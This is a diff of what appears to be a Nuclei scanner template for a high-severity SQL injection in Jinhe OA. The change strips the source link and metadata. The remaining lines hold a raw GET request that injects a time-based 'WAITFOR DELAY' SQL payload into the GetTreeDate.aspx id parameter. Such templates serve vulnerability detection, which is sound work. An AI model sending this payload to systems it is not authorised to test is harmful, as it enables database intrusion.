@@ -3,12 +3,8 @@ info:
   name: 金和OA SQL注入漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/ty0nftdw7psm32gw'
+  description: ''
   tags: sqli,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: ty0nftdw7psm32gw
-    fofa: 暂无
 http:
 - raw:
   - 'GET /C6/Jhsoft.Web.users/GetTreeDate.aspx/?id=1;WAITFOR+DELAY+%270:0:5%27+--%20and%201=1 HTTP/1.1
